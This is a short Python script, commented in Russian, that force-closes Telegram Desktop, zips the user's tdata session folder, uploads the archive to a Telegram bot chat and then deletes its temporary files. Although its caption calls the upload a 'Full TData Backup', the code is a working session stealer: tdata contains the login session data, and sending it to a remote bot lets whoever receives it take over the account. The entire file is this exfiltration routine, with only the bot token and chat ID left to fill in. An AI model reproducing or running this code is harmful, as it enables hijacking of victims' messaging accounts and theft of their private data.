import os
import shutil
import zipfile
import requests
import subprocess
from datetime import datetime

subprocess.run("taskkill /IM Telegram.exe /F")

# ==================== НАСТРОЙКИ ====================
BOT_TOKEN = "BOT_TOKEN"
CHAT_ID   = "CHAT ID"
# ===================================================

def zip_and_send():
    # 1. Путь к Telegram
    tdata_path = os.path.expandvars(r"%APPDATA%\Telegram Desktop\tdata")
    if not os.path.exists(tdata_path):
        print("[-] tdata не найден")
        return

    # 2. Временная папка для работы
    temp_folder = os.path.join(os.environ['TEMP'], "TG_Full_Backup")
    if os.path.exists(temp_folder):
        shutil.rmtree(temp_folder)
    os.makedirs(temp_folder)

    zip_path = os.path.join(os.environ['TEMP'], "full_session.zip")

    print("[*] Начинаю упаковку...")

    # 3. Создаем ZIP с максимальным сжатием
    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as z:
            for root, dirs, files in os.walk(tdata_path):
                # ФИЛЬТРАЦИЯ: Пропускаем мусор, который весит гигабайты
                # Эти папки не нужны для работы сессии, в них только кэш картинок/видео
                if any(x in root.lower() for x in ['user_data', 'emoji', 'dumps', 'webview', 'tdummy', 'temp']):
                    continue
                
                for file in files:
                    # Пропускаем очень тяжелые лог-файлы, если они есть
                    if file.endswith('.log') or 'cache' in file.lower():
                        continue
                        
                    file_path = os.path.join(root, file)
                    # Вычисляем путь внутри архива (относительно tdata)
                    arc_name = os.path.relpath(file_path, os.path.dirname(tdata_path))
                    
                    try:
                        z.write(file_path, arc_name)
                    except:
                        continue

        # 4. Проверка размера и отправка
        file_size = os.path.getsize(zip_path) / (1024 * 1024)
        print(f"[+] Архив создан. Размер: {file_size:.2f} MB")

        if file_size > 49:
            print("[-] Даже после сжатия файл слишком велик (>50MB). Попробуй очистить кэш в Telegram.")
            return

        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(zip_path, 'rb') as f:
            r = requests.post(
                url, 
                data={'chat_id': CHAT_ID, 'caption': f'📦 Full TData Backup\nSize: {file_size:.2f}MB'}, 
                files={'document': f},
                timeout=120 # Увеличиваем время ожидания для больших файлов
            )
            
        if r.status_code == 200:
            print("[+] Успешно отправлено!")
        else:
            print(f"[-] Ошибка отправки: {r.status_code}\n{r.text}")

    except Exception as e:
        print(f"[-] Произошла ошибка: {e}")
    finally:
        # Чистим за собой
        if os.path.exists(zip_path): os.remove(zip_path)
        if os.path.exists(temp_folder): shutil.rmtree(temp_folder)

if __name__ == "__main__":
    zip_and_send()